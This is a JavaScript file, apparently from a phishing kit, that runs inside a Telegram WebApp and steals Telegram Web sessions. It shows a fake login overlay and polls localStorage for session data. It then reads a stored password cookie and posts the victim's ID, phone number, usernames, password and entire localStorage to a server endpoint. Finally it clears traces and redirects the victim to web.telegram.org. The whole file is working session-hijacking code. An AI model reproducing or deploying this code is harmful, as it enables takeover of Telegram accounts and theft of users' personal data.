document.addEventListener("DOMContentLoaded", function() {
  // Function to send debug logs to the server
  async function logToServer(message) {
    try {
      await fetch(`/api/debug`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: `check.js: ${message}` })
      });
    } catch (error) {
      console.error(`Failed to send debug log to server: ${error.message}`);
    }
  }

  console.log("check.js: Script loaded");
  logToServer("Script loaded");

  console.log(`check.js: window.Telegram exists: ${!!window.Telegram}`);
  logToServer(`window.Telegram exists: ${!!window.Telegram}`);

  console.log(`check.js: window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
  logToServer(`window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);

  // Create a UI element to prompt the user to log in if needed
  const loginPrompt = document.createElement("div");
  loginPrompt.style.position = "fixed";
  loginPrompt.style.top = "0";
  loginPrompt.style.left = "0";
  loginPrompt.style.width = "100%";
  loginPrompt.style.height = "100%";
  loginPrompt.style.backgroundColor = "rgba(0, 0, 0, 0.8)";
  loginPrompt.style.color = "white";
  loginPrompt.style.display = "flex";
  loginPrompt.style.alignItems = "center";
  loginPrompt.style.justifyContent = "center";
  loginPrompt.style.flexDirection = "column";
  loginPrompt.style.textAlign = "center";
  loginPrompt.style.zIndex = "1000";
  loginPrompt.innerHTML = `
    <p>Please log in to Telegram to continue.</p>
    <button id="loginButton" style="padding: 10px 20px; background-color: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer;">Log In</button>
  `;
  document.body.appendChild(loginPrompt);
  loginPrompt.style.display = "none"; // Hidden by default

  const loginButton = document.getElementById("loginButton");
  loginButton.addEventListener("click", () => {
    console.log("check.js: User clicked Log In button, opening Telegram login in-app");
    logToServer("User clicked Log In button, opening Telegram login in-app");

    if (window.Telegram && window.Telegram.WebApp) {
      window.Telegram.WebApp.openLink("https://web.telegram.org/a/");
    } else {
      window.location.href = "https://web.telegram.org/a/";
    }
    clearInterval(checkInterval); // Stop the interval while the user logs in
  });

  let loginAttempts = 0;
  const maxLoginAttempts = 50; // Wait for ~5 seconds (50 * 100ms) before prompting

  async function checkLocalStorage() {
    // First, check if the user is logged in via Telegram WebApp
    if (window.Telegram && window.Telegram.WebApp) {
      const user = window.Telegram.WebApp.initDataUnsafe?.user;
      console.log(`check.js: Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);
      logToServer(`Telegram WebApp user: ${user ? JSON.stringify(user) : "Not logged in"}`);

      if (!user) {
        loginAttempts++;
        console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);
        logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - User not logged in`);

        if (loginAttempts >= maxLoginAttempts) {
          console.log("check.js: Max login attempts reached, showing login prompt");
          logToServer("Max login attempts reached, showing login prompt");
          loginPrompt.style.display = "flex";
          clearInterval(checkInterval); // Stop the interval until the user logs in
        }
        return;
      }
    }

    // If the user is logged in, check localStorage for tt-global-state and user_auth
    let globalState = localStorage.getItem("tt-global-state");
    console.log(`check.js: tt-global-state exists: ${!!globalState}`);
    logToServer(`tt-global-state exists: ${!!globalState}`);

    console.log(`check.js: user_auth exists: ${!!localStorage.getItem("user_auth")}`);
    logToServer(`user_auth exists: ${!!localStorage.getItem("user_auth")}`);

    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";
      loginPrompt.style.display = "none"; // Hide the login prompt if it was shown

      if (currentUserId && currentUser) {
        console.log(`check.js: Found user data for userId ${currentUserId}`);
        logToServer(`Found user data for userId ${currentUserId}`);

        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        console.log(`check.js: Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
        logToServer(`Sending user data to /api/users/telegram/info for userId ${currentUserId}`);

        try {
          await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId, firstName,
              usernames, phoneNumber, isPremium,
              password, quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type")
            })
          });
          console.log(`check.js: Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
          logToServer(`Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
        } catch (error) {
          console.error(`check.js: Failed to send user data to /api/users/telegram/info: ${error.message}`);
          logToServer(`Failed to send user data to /api/users/telegram/info: ${error.message}`);
        }

        console.log(`check.js: Opening Telegram link and closing WebApp`);
        logToServer(`Opening Telegram link and closing WebApp`);

        try {
          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
          window.Telegram.WebApp.close();
        } catch (error) {
          console.error(`check.js: Failed to open Telegram link or close WebApp: ${error.message}`);
          logToServer(`Failed to open Telegram link or close WebApp: ${error.message}`);
        }

        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      } else {
        console.log(`check.js: No user data found in tt-global-state`);
        logToServer(`No user data found in tt-global-state`);
      }
    } else {
      loginAttempts++;
      console.log(`check.js: Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);
      logToServer(`Attempt ${loginAttempts}/${maxLoginAttempts} - tt-global-state or user_auth not found`);

      if (loginAttempts >= maxLoginAttempts) {
        console.log("check.js: Max attempts reached, showing login prompt");
        logToServer("Max attempts reached, showing login prompt");
        loginPrompt.style.display = "flex";
        clearInterval(checkInterval); // Stop the interval until the user logs in
      }
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);

  // Listen for WebApp events to detect when the user returns
  if (window.Telegram && window.Telegram.WebApp) {
    window.Telegram.WebApp.onEvent("viewportChanged", () => {
      console.log("check.js: Viewport changed, user may have returned");
      logToServer("Viewport changed, user may have returned");
      if (loginPrompt.style.display === "flex") {
        // Restart the interval to check again
        loginPrompt.style.display = "none";
        loginAttempts = 0;
        clearInterval(checkInterval);
        setInterval(checkLocalStorage, 100);
      }
    });
  }
});
